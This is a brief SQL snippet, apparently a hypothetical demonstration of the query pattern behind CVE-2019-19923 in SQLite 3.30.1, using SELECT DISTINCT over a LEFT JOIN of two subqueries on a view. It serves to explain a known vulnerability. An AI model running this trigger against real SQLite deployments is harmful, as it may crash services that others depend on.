-- Hypothetical example to understand CVE-2019-19923's vulnerable pattern
-- This requires a setup with specific SQLite version (3.30.1) and a database schema that includes a view.

-- Assuming 'myView' is a view already created in the database for demonstration
-- The view could be created as follows for setup (not part of the exploit):
-- CREATE VIEW myView AS SELECT * FROM myTable;

SELECT DISTINCT a.*
FROM 
    (SELECT * FROM myView) a
LEFT JOIN 
    (SELECT * FROM myView) b
ON a.id = b.id;
